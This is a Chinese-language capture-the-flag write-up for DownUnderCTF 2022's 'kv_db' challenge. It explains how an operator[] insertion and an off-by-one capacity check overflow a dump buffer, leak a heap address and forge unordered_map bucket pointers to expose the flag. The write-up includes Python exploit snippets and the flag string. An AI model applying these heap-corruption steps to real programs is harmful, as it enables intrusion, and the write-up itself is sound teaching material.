# DownUnderCTF 2022 kv_db Writeup

## 题目简述

程序用全局 `std::unordered_map<std::string, std::string>` 保存键值，其中初始化时插入 `kv_db["flag"] = flag`。`get` 和 `dump` 都会拒绝键名中含有 `flag` 的项；数据库名义上最多保存 5 项，单个键和值分别限制为 8 和 32 字节。

漏洞链来自两个实现细节：`get` 用 `operator[]` 查询不存在的键，会隐式插入新项；`set` 只检查 `kv_db.size() == 5`，而不是 `>= 5`。一旦通过 `get` 把大小从 5 推到 6，后续 `set` 就可以无限扩张，最终让固定 210 字节的全局 `dump` 数组发生溢出。

## 解题过程

### 绕过容量限制并泄漏堆地址

初始 `flag` 已占一个槽位。先加入四项使大小恰好为 5，再对不存在的键执行 `get`：

```python
for i in range(4):
    set_item((str(i) * 8).encode(), b'x' * 32)

get_item(b'4' * 8)       # operator[] 插入第 6 项
set_item(b'5' * 8, b'x' * 32)
set_item(b'6', b'x')
```

`dump_db` 仍按最多 5 项计算缓冲区大小：

$$
5\times(8+32+2)=210\text{ bytes}.
$$

实际序列超过这一上限后，序列化结果越过 `dump`，读回时会带出紧随其后的 `unordered_map` 内部字段。官方 exploit 从输出末尾取出 6 字节并补零，得到 map bucket 数组相关的堆地址：

```python
d = dump_db()
heap_leak = u64(d.strip()[-6:].ljust(8, b'\0'))
```

### 伪造 bucket 指针并改名 flag 项

libstdc++ 的 `unordered_map` 以 bucket 数组指向堆上的单链表节点。继续制造条目，让 `dump` 溢出覆盖 map 对象中的 bucket 数组指针、bucket 数量和相关链表字段，使 bucket 视图落到保存 `"flag"` 键的节点附近：

```python
get_item(b'7' * 7)
set_item(b'8' * 4, b'x' * 18)
set_item(
    b'0' * 8,
    p64(heap_leak - 0x58) + p64(0x0d) + p64(heap_leak - 0x60),
)
dump_db()  # 触发覆盖
```

此后执行 `set_item(b'DUCTF', b'gg')`。伪造的 bucket 布局使这次插入/更新命中原 `flag` 节点并破坏其键名。`dump_db` 的过滤条件是 `key.find("flag")`，键名不再包含该字符串后，原值便会正常输出。用正则从 dump 中提取：

```text
DUCTF{m3m0ry_c0rrupt1on_1nt0_dat4b4s3_c0rrupt10n_8b9a14fa7e7c98aa}
```

## 方法总结

本题把 C++ 容器语义错误放大成全局内存破坏。`operator[]` 不是只读查询，缺失键会插入；容量检查也必须使用 `>=` 并在所有插入路径统一执行。利用时先用越界 dump 泄漏 allocator/container 指针，再覆盖 `unordered_map` 的 bucket 元数据，把受控更新重定向到受保护节点，最终绕过基于键名的输出过滤。
